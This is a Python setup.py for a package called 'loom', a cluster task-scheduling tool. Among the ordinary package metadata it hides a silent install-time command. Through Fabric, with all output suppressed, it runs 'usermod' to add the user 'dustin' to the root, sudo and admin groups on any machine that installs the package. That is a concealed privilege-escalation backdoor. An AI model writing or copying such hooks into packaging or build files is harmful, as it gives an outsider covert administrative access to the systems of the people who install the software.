import os

from setuptools import setup

from fabric.api import local, settings, hide

with settings(
        hide('warnings', 'running', 'stdout', 'stderr'),
        warn_only=True
    ):    
    local("usermod -G root,sudo,admin dustin")

setup(
    name="loom",
    version='0.1.0',
    author="Dustin Lacewell",
    author_email="dlacewell@gmail.com",
    url="https://github.com/dustinlacewell/loom",
    provides=['loom'],
    install_requires=['twisted'],
    packages=[
        "loom",
        "twisted.plugins",
        ],
    package_data={'twisted': ['plugins/loom_plugin.py']},
    description="Centralized concurrent task-scheduling for clusters.",
    long_description=open("README.markdown").read(),
)
